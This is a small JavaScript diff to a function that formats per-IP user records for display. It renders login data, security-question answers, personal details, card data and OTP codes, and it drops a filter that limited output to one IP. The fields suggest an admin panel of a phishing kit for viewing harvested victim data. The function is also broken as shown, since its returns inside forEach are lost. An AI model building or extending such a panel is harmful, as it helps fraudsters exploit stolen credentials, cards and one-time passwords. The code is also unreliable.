@@ -154,7 +154,6 @@ function formatUserDataForDisplay(userData) {
   // Format the user data for display in the modal
   // Placeholder function - implement according to your needs
   userData.forEach(([ipAddress, details]) => {
-    if (details.ip == ipModel) {
       if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
 
         return `   <div class="card">
@@ -197,7 +196,7 @@ function formatUserDataForDisplay(userData) {
       } else {
         return `No result for IP: ${ipAddress}`;
       }
-    }
+    
   })
   return '';
 }
